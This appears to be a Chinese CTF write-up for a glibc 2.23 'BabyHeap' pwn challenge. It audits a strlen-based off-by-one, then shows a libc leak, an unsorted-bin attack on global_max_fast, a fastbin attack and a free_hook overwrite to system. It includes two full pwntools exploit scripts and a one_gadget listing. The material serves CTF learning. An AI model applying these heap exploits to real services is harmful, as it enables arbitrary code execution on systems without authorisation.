# BabyHeap

题目来源：http://xmctf.top/

![NhvWJE](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/NhvWJE.png)

没有libc-2.23的环境，就先patch了一下。

**审计**

一个Off By One，~~能够覆盖下一个chunk_size的一个字节为0~~。但后来发现不是，只要输入结尾没有\n,就能溢出一个字节，是我审计错了。能够覆盖chunk_size为小于0xff的任意值。因为a2的来源是strlen，strlen误将下一个chunk的size也作为字符串的一部分，导致a2比原来多一个字节。

```c
signed __int64 __fastcall sub_A8A(char *a1, unsigned int a2)  //a1是buf，a2为长度
{
  signed __int64 result; // rax
  int v3; // [rsp+1Ch] [rbp-4h]

  v3 = read(0, a1, (signed int)a2); //读取a2长度的字符到a1
  if ( v3 <= 0 )
    exit(1);
  if ( a1[v3 - 1] == '\n' )        //如果a1结尾包含\n则,则替换为0
  {
    result = (signed __int64)&a1[v3 - 1];
    *(_BYTE *)result = 0;
  }
  else
  {
    result = a2;
    if ( a2 != v3 )
    {
      result = (signed __int64)&a1[v3];
      *(_BYTE *)result = 0;
    }
  }
  return result;
}

int edit()
{
  unsigned int v0; // eax
  int v2; // [rsp+Ch] [rbp-4h]

  printf("index: ");
  v2 = sub_B0A();
  if ( v2 < 0 || (unsigned int)v2 > 0xF || !qword_202060[v2] )
    return puts("Error: Invalid index!\n");
  printf("data: ");
  v0 = strlen((const char *)qword_202060[v2]);  //关键部分，strlen获取字符串长度
  sub_A8A((char *)qword_202060[v2], v0);
  return puts("Success!");
}
```

**Demo**

```c
add(0x18,"A"*0x18)#0 #一定要填满，这样才能和chunk_1的size构成连接
add(0x18,"B"*0x18)#1
edit(0,"A"*0x18) #+"\x41" 加上任何单字节能够覆盖下一个chunk的size值
show(0)
#delete(0)
```

![q8WKXW](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/q8WKXW.png)

能够实现一个字节的溢出，覆盖size值，这样就能构造一个很长的fake chunk。

可以伪造加长chunk，泄露libc地址。不过这里的free居然触发不了fastbin，有点奇怪。（后面会解释原因）

通过overlap泄露unsortbin的地址，计算出libc的偏移地址。如果要泄露heap的偏移地址，需要申请两个连续的chunk，chunk中会存有另一个chunk的地址。

![image-20200502143847282](/Users/migraine/Library/Application Support/typora-user-images/image-20200502143847282.png)

泄露地址：

```shell
add(0x18,"A"*0x18)#0
add(0x18,"B"*0x18)#1
add(0x18,"C"*0x18)#2
add(0x18,"D"*0x18)#3
#add(0x38,"E"*0x38)#3
add(0x18,"F"*0x18)#4
add(0x18,"I"*0x18) #5
edit(0,"O"*0x18+"\x81")#1's size->0x81
delete(1) #free 1
add(0x18,"GGGG") #let the unsorbin addr into chunk2
show(2) #leak libc addr

p.recv(6)
#print("libc"+hex(u64(p.recv(6).ljust(8,b"\x00"))))
unsortbin=u64(p.recv(6).ljust(8,b"\x00"))
libc=unsortbin-0x39bb78
print("[+] libc_addr="+hex(libc))
```

**Getshell**

因为保护基本全开了。不能通过覆盖got表来实现getshell。可采用的方式是malloc_hook覆盖或者，free_hook覆盖。基础要求是要实现fastbin attack。但是这里的0x20以及以上大小的free chunk都属于unosortbin实在是奇怪，难道global_max_fast被改了？果然，罪魁祸首。大于16的free chunk都会被链接到unsortbin。

![dKMUwD](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/dKMUwD.png)

思路使用unsortbin attack写一个大值覆盖**global_max_fast**,然后利用fastbin attack。

构造overlap之后覆写unosortbin的bk为globa_max_fast-0x10，然后申请一块较大内存即可触发。

题目条件下，只有在申请内存块的同时刻才能覆盖unsort bin，但是申请内存的过程中，堆管理会遍历unsortbin寻找可用堆块。实验过程中我发现，申请之后把原本在unsortbin的chunk被分配到别的链里去（small bins），就没办法用unsortbin attack。绕过方法是申请的内存和unsortbin中的大小某一块相同，unsortbin链的chunk会被直接取下来，这样unsortbin链堆其他chunjk就会被保留。

构造chunk_60 大小为0x61，包含chunk_a0。然后申请0x61(malloc(x59))

![1sM7Mx](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/1sM7Mx.png)

覆盖Bk为global_max_fast-0x10 （截图错了）

![FqETSq](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/FqETSq.png)

unsortbin attack成功修改**global_max_fast**

![JySmO5](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/JySmO5.png)

代码如下

```python
global_max_fast=3790920+libc

#getshell
add(0x18,"A"*0x18)#6
add(0x18,"B"*0x18)#7
add(0x18,"C"*0x18)#8
add(0x18,"D"*0x18)#9
add(0x18,"D"*0x18)#10

#将两个chunk放入unsortbin链
delete(7)
delete(5)

#将前面的堆加长，使得两个堆形成overlap
edit(6,"O"*0x18+"\x61") #1's size->0x81 
#申请一块和unsortbin链首相同大小的chunk，覆盖fd=0，bk=global_max_fast-0x10
add(0x58,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p64(0)+p64(global_max_fast-0x10))
add(21,"AAAA") #触发unsortbin
```

但是此时无法申请内存，需要修复unsortbin。不过我一开始想偷懒，就考虑直接用fastbin attack，修改malloc_hook。

**覆盖malloc_hook**

我的解决方案是事先free大量的fastbin chunk，留给后面fastbin attack用。

![pyGdm0](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/pyGdm0.png)



修改fastbin指向malloc_hook，不过这里还得改。。。要切到0x70

![GRteoJ](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/GRteoJ.png)

整个逻辑到现在其实挺复杂了，free 0x61（伪造的chunk）会有个fastbin的next size检测，这个要在一开始就伪造好。（图中选中区域）

![2Ew20G](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/2Ew20G.png)

![LiwnwS](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/LiwnwS.png)

实现到跳转到**one_gadget**,不过全部one_gadget失效.目前为止的EXP如下

```python
#!/usr/bin/python3
from pwn import *

p=process(["babyheap"],env={"LD_PRELOAD":"/glibc/2.23/64/lib/libc.so.6"})
#p=remote("nc.eonew.cn",10502)
#p=process("babyheap-bak")
context.log_level='Debug'
context.terminal=context.terminal = ['tmux','splitw','-h' ]
gdb.attach(p)

r  = lambda data	:p.recv(data)
ru = lambda data 	:p.recvuntil(data)
s  = lambda data	:p.send(data)
sl = lambda data	:p.sendline(data)

def add(size,data):
  ru("your choice:")
  sl("1")
  ru("size:")
  sl(str(size))
  ru("data:")
  sl(data)

def delete(index):
  ru("your choice:")
  sl("2")
  ru("index:")
  sl(str(index))

def edit(index,data):
  ru("your choice:")
  sl("3")
  ru("index:")
  sl(str(index))
  ru("data:")
  s(data)

def show(index):
  ru("your choice:")
  sl("4")
  ru("index:")
  sl(str(index))


add(0x18,"A"*0x18)#0
add(0x18,"B"*0x18)#1
add(0x18,"C"*0x18)#2
add(0x18,"D"*0x18)#3
#add(0x38,"E"*0x38)#3
add(0x18,"F"*0x18)#4
add(0x18,"I"*0x18) #5
edit(0,"O"*0x18+"\x81")#1's size->0x81
delete(1) #free 1
add(0x18,"GGGG")#6 #let the unsorbin addr into chunk2
show(2) #leak libc addr


p.recv(6)
#print("libc"+hex(u64(p.recv(6).ljust(8,b"\x00"))))
unsortbin=u64(p.recv(6).ljust(8,b"\x00"))
libc=unsortbin-0x39bb78
print("[+] libc_addr="+hex(libc))


global_max_fast=3790920+libc

#unsort bin attack
add(0x18,"A"*0x18)#6
add(0x18,"B"*0x18)#7
add(0x18,"C"*0x18)#8
add(0x18,"D"*0x18)#9
add(0x18,"D"*0x18)#10

add(0x18,"E"*0x18)#11
add(0x68,"F"*0x68)#12
edit(12,p64(0)*3+p64(0x21)) #fake next_size(for fastbin attack)
add(0x18,"G"*0x18)#13
add(0x18,"H"*0x18)#14
#add(0x18,"I"*0x18)#15

delete(7)
delete(5)

edit(6,"O"*0x18+"\x61") #1's size->0x81
#add(0x58,"AAAAAAAAAA")
add(0x58,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p64(0)+p64(global_max_fast-0x10))
add(21,"AAAA")#13  #unsort bin attack

#fastbin attack

free_hook=3790760+libc
malloc_hook=3783440+libc
#one_gadget= 0xf02b0+libc
one_gadget=0x41414141

delete(14)
delete(13)
delete(12)
delete(11)
delete(10)
delete(9)
#delete(15)

add(0x18,"a"*0x18)#9
add(0x18,"b"*0x18)#10
add(0x18,"c"*0x18)#11

edit(9,"a"*0x18+"\x61")
#edit(10,"b"*0x18+"\x71")
delete(10)
#delete(11)
add(0x58,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x71)+p64(malloc_hook-35))
add(0x68,"AAAA")
add(0x68,b"F"*19+p64(one_gadget))

add(0x18,"PWN")


p.interactive()


'''
root@59b9934cad24:/ctf/work/babyheap# one_gadget -l1 libc-2.23.so 
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
      rax == NULL

      0x4526a execve("/bin/sh", rsp+0x30, environ)
      constraints:
            [rsp+0x30] == NULL

            0xcd0f3 execve("/bin/sh", rcx, r12)
            constraints:
                  [rcx] == NULL || rcx == NULL
                    [r12] == NULL || r12 == NULL

                    0xcd1c8 execve("/bin/sh", rax, r12)
                    constraints:
                          [rax] == NULL || rax == NULL
                            [r12] == NULL || r12 == NULL

                            0xf02a4 execve("/bin/sh", rsp+0x50, environ)
                            constraints:
                                  [rsp+0x50] == NULL

                                  0xf02b0 execve("/bin/sh", rsi, [rax])
                                  constraints:
                                        [rsi] == NULL || rsi == NULL
                                          [[rax]] == NULL || [rax] == NULL

                                          0xf1147 execve("/bin/sh", rsp+0x70, environ)
                                          constraints:
                                                [rsp+0x70] == NULL

                                                0xf66f0 execve("/bin/sh", rcx, [rbp-0xf8])
                                                constraints:
                                                      [rcx] == NULL || rcx == NULL
                                                        [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL

'''


```

通过realloc调整栈环境无果。。。不过之前的操作都是有意义的，修改malloc_hook无效，但是我们也获得了对main_arena的写。

**修复unsortbin&&修改free_hook**

free_hook覆盖的通用思路是覆盖main_arena+0x88(指向topchunk)，修改top chunk指向free_hook前的地址，然后申请内存，多次申请就能获取到对free chunk的读写。

不过在此之前，还是得修复unsortbin的空间。这里可以通过修改main_arena来修改unosortbin，顺便修改top_chunk，一举两得。这篇[文章](https://xz.aliyun.com/t/7020)讲的很很详细。

![sDOI69](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/sDOI69.png)

通过覆盖main_arena来实现fastbin attack，修复unosortbin。这里我们原来的chunk长度可能不够，所以可以覆盖main_arena+0x48( fastbin-0x70)，重新获取一个0x70的chunk。

首先在main_arena中伪造一个0x70的chunk，将main_arena+48处的指针指向这个fakechunk。下一次申请0x70的chunk就会控制这个chunk。

![image-20200503105559671](/Users/migraine/Library/Application Support/typora-user-images/image-20200503105559671.png)

![y3DeY9](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/y3DeY9.png)

下图是main_arena处的空间，我们要在main_arena+8伪造一个0x70的fake_chunk。借助这块内存了来修改top_chunk以及恢复unsortbin链。

```
pwndbg> x/20xg &__malloc_hook+1
                                                                              0x7fa801080b18: 0x0000000000000000      0x0000000000000000
<main_arena+8>:  0x0000000000000000      0x0000000000000070 <--fake chunk
<main_arena+24>: 0x3030303030303030      0x3030303030303030
<main_arena+40>: 0x3030303030303030      0x3030303030303030
<main_arena+56>: 0x3030303030303030      0x3030303030303030                                                                 
0x7fa801080b68 <main_arena+72>: 0x3030303030303030      0x3030303030303030
0x7fa801080b78 <main_arena+88>: 0x3030303030303030   <--top chunk   0x3030303030303030  
0x7fa801080b88 <main_arena+104>:        0x3030303030303030      0x303030303030 <--unsort bin
0x7fa801080b98 <main_arena+120>:        0x3030303030303030      0x00007fa80108                                                                  0x7fa801080ba8 <main_arena+136>:        0x00007fa801080b98      0x00007fa801080b98
```

修复unosortbin 填充结构:8xchunk+fake_top_chunk+chunk+*(main_area+0x88)x2

![5lpWBm](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/5lpWBm.png)

修复了unsortbin之后

![MPffgg](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/MPffgg.png)

修改代码(不是最终的)

```
fake_chunk=0x39bb20+libc+8 #在main_area构建一个fake chunk
main_aren_88=0x39bb78+libc #用于修复unsortbin
add(0x68,b"\x00"*(19+8)+p64(0)*2+p64(0)+p64(0x70)*4+p64(fake_chunk)) #构造fake_chunk
add(0x68,p64(0)*8+p64(0)+p64(0)+p64(main_aren_88)*2) #申请这个fake_chunk，并且修复unsortbin
```

在free_hook前面找到一个符合伪造top_chunk的条件,然后覆盖main_arena+0x88指向这个fake_top_chunk，之后只需要不断申请chunk，就能申请到free_hook的地址。、

例如，这里的initial+16的size位置正好包含一个很大的值，可以用来伪造fake_top_chunk

```
free_hook=3790760+libc
fake_top_chunk_free_hook-0xb58
```

![oO3ED8](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/oO3ED8.png)

申请一次后的效果，会一路向下申请chunk。

![XlLhiT](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/XlLhiT.png)

```python
fake_chunk=0x39bb20+libc+8
main_aren_88=0x39bb78+libc
#fake_top_chunk=0x39d7e0+libc
free_hook=3790760+libc
fake_top_chunk=free_hook-0xb58

#fake_top_chunk=libc
add(0x68,b"\x00"*(19+8)+p64(0)*2+p64(0)+p64(0x70)*4+p64(fake_chunk))
add(0x68,p64(0)*8+p64(fake_top_chunk)+p64(0)+p64(main_aren_88)*2)


delete(0)
delete(1)
add(0x68,p64(0x6162636465))
add(0x68,p64(0x1234))
```

但是chunk数量貌似不够。。。emmm

经过实践，先分配大量0x20，然后释放到fastbin，然后分配0x30之后释放，一路分配到0x70勉强够修改free_hook。调试了很久，终于整好凑到能够覆盖free_hook

![FYgj1P](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/FYgj1P.png)

修改free_hook，接下来只需要free一个包含/bin/sh的内存即可。

![VB4A2l](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/VB4A2l.png)

总结一下**知识点**，strlen导致一个字节溢出，通过unsortbin attack修改global_max_fast，通过覆盖free_hook拿shell。中间还有无数的坑，python3跑出来结果和远程还不一样。

# 小结

- **strlen**也可能遭遇字符串拼接导致的长度问题，Auditing的时候要注意。

- global_max_fast 利用（使用unsortbin来覆盖）
- unsortbin只有切好取出完整堆，链接中的堆块才不会被分配到其他bins中去。
- unsortbin之后的修复（覆盖main_arena+104和108）
- main_arena中伪造chunk挺好用的
- 通过修改Topchunk(main_arena+0x88)来覆写free_hook

# 参考

https://www.anquanke.com/post/id/84752

https://xz.aliyun.com/t/5082

[house of lore](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_lore-zh/)

https://xz.aliyun.com/t/7020

#EXP

```python
#!/usr/bin/python3
from pwn import *

p=process(["babyheap"],env={"LD_PRELOAD":"/glibc/2.23/64/lib/libc.so.6"})
#p=remote("nc.eonew.cn",10502)
#p=process("babyheap-bak")
context.log_level='Debug'
context.terminal=context.terminal = ['tmux','splitw','-h' ]
gdb.attach(p)

r  = lambda data	:p.recv(data)
ru = lambda data 	:p.recvuntil(data)
s  = lambda data	:p.send(data)
sl = lambda data	:p.sendline(data)

def add(size,data):
  ru("your choice:")
  sl("1")
  ru("size:")
  sl(str(size))
  ru("data:")
  sl(data)

def delete(index):
  ru("your choice:")
  sl("2")
  ru("index:")
  sl(str(index))

def edit(index,data):
  ru("your choice:")
  sl("3")
  ru("index:")
  sl(str(index))
  ru("data:")
  s(data)

def show(index):
  ru("your choice:")
  sl("4")
  ru("index:")
  sl(str(index))


add(0x18,"A"*0x18)#0
add(0x18,"B"*0x18)#1
add(0x18,"C"*0x18)#2
add(0x18,"D"*0x18)#3
#add(0x38,"E"*0x38)#3
add(0x18,"F"*0x18)#4
add(0x18,"I"*0x18) #5
edit(0,"O"*0x18+"\x81")#1's size->0x81
delete(1) #free 1
add(0x18,"GGGG")#6 #let the unsorbin addr into chunk2
show(2) #leak libc addr


p.recv(6)
#print("libc"+hex(u64(p.recv(6).ljust(8,b"\x00"))))
unsortbin=u64(p.recv(6).ljust(8,b"\x00"))
libc=unsortbin-0x39bb78
print("[+] libc_addr="+hex(libc))


global_max_fast=3790920+libc

#unsort bin attack
add(0x18,"A"*0x18)#6
add(0x18,"B"*0x18)#7
add(0x18,"C"*0x18)#8
add(0x18,"D"*0x18)#9
add(0x18,"D"*0x18)#10

add(0x18,"E"*0x18)#11
add(0x68,"F"*0x68)#12
edit(12,p64(0)*3+p64(0x21)) #fake next_size(for fastbin attack)
add(0x18,"G"*0x18)#13
add(0x18,"H"*0x18)#14
#add(0x18,"I"*0x18)#15

delete(7)
delete(5)

edit(6,"O"*0x18+"\x61") #1's size->0x81
#add(0x58,"AAAAAAAAAA")
add(0x58,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p64(0)+p64(global_max_fast-0x10))
add(21,"AAAA")#13  #unsort bin attack

#fastbin attack

free_hook=3790760+libc
malloc_hook=3783440+libc
realloc=0x846C0+libc
one_gadget= 0x4526a+libc
#one_gadget=0x41414141

delete(14)
delete(13)
delete(12)
delete(11)
delete(10)
delete(9)
#delete(15)

add(0x18,"a"*0x18)#9
add(0x18,"b"*0x18)#10
add(0x18,"c"*0x18)#11

edit(9,"a"*0x18+"\x61")
#edit(10,"b"*0x18+"\x71")
delete(10)
#delete(11)
add(0x58,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x71)+p64(malloc_hook-35))
add(0x68,"AAAA")
#add(0x68,b"F"*(19-4)+p64(one_gadget)+p64(realloc+0x1b))

#add(0x18,"PWN")
fake_chunk=0x39bb20+libc+8
main_aren_88=0x39bb78+libc
#fake_top_chunk=0x39d7e0+libc
free_hook=3790760+libc
fake_top_chunk=free_hook-0xb58

#fake_top_chunk=libc
add(0x68,b"\x00"*(19+8)+p64(0)*2+p64(0)+p64(0x70)*4+p64(fake_chunk))
add(0x68,p64(0)*8+p64(fake_top_chunk)+p64(0)+p64(main_aren_88)*2)

for i in range(0,3):
    delete(i)
#delete(4)
delete(5)
#delete(6)
for i in range(7,8):
    delete(i)
delete(10)
delete(11)
delete(12)
#delete(13)
#delete(14)

#raw_input()

#add(0x6f,p64(0x1234))

add(0x6f,p64(0x1234))
add(0x6f,p64(0x1234))
add(0x6f,p64(0x1234))
add(0x6f,p64(0x1234))
add(0x6f,p64(0x1234))
add(0x6f,p64(0x1234))
add(0x6f,p64(0x1234))
add(0x6f,p64(0x1234))
add(0x6f,p64(0x1234))
#add(0x58,p64(0x1234))
#add(0x48,p64(0x1234))

for i in range(0,4):
        delete(i)
delete(5)
for i in range(7,10):
        delete(i)
delete(10)
delete(11)
delete(12)
#delete(13)
#delete(14)

add(0x68,p64(0x1234))
add(0x68,p64(0x1234))
add(0x68,p64(0x1234))
add(0x68,p64(0x1234))
add(0x68,p64(0x1234))
add(0x68,p64(0x1234))
add(0x68,p64(0x1234))
add(0x68,p64(0x1234))
add(0x68,p64(0x1234))
add(0x68,p64(0x1234))
#add(0x68,p64(0x1234))
#add(0x48,p64(0x1234))



for i in range(0,3):
        delete(i)
delete(5)
#delete(6)
for i in range(7,8):
        delete(i)
delete(10)
#delete(11)
delete(12)
#delete(13)
#delete(14)
#add(0x48,p64(0x1234))
#add(0x48,p64(0x1234))
add(0x48,p64(0x1234))
add(0x48,p64(0x1234))
add(0x48,p64(0x1234))
add(0x48,p64(0x1234))
add(0x48,p64(0x1234))
add(0x48,p64(0x1234))
add(0x48,p64(0x1234))

#add(0x38,p64(0x1234))
#add(0x48,p64(0x1234))
#add(0x58,p64(0x1234))


for i in range(0,3):
            delete(i)
delete(6)
delete(5)
for i in range(7,8):
            delete(i)
delete(10)
#delete(12)

#delete(14)
#delete(1)

system=libc+259408
#add(0x58,p64(0x1234))
add(0x58,p64(0x1234))
add(0x58,"/bin/sh\x00")
add(0x58,"/bin/sh\x00")
add(0x38,"/bin/sh\x00")
add(0x38,"/bin/sh\x00")
add(0x38,p64(0)*5+p64(system))
#add(0x38,p64(0x1234))
#add(0x38,p64(0x1234))
delete(6)

p.interactive()


'''
root@59b9934cad24:/ctf/work/babyheap# one_gadget -l1 libc-2.23.so 
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
      rax == NULL

      0x4526a execve("/bin/sh", rsp+0x30, environ)
      constraints:
            [rsp+0x30] == NULL

            0xcd0f3 execve("/bin/sh", rcx, r12)
            constraints:
                  [rcx] == NULL || rcx == NULL
                    [r12] == NULL || r12 == NULL

                    0xcd1c8 execve("/bin/sh", rax, r12)
                    constraints:
                          [rax] == NULL || rax == NULL
                            [r12] == NULL || r12 == NULL

                            0xf02a4 execve("/bin/sh", rsp+0x50, environ)
                            constraints:
                                  [rsp+0x50] == NULL

                                  0xf02b0 execve("/bin/sh", rsi, [rax])
                                  constraints:
                                        [rsi] == NULL || rsi == NULL
                                          [[rax]] == NULL || [rax] == NULL

                                          0xf1147 execve("/bin/sh", rsp+0x70, environ)
                                          constraints:
                                                [rsp+0x70] == NULL

                                                0xf66f0 execve("/bin/sh", rcx, [rbp-0xf8])
                                                constraints:
                                                      [rcx] == NULL || rcx == NULL
                                                        [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL

'''
```

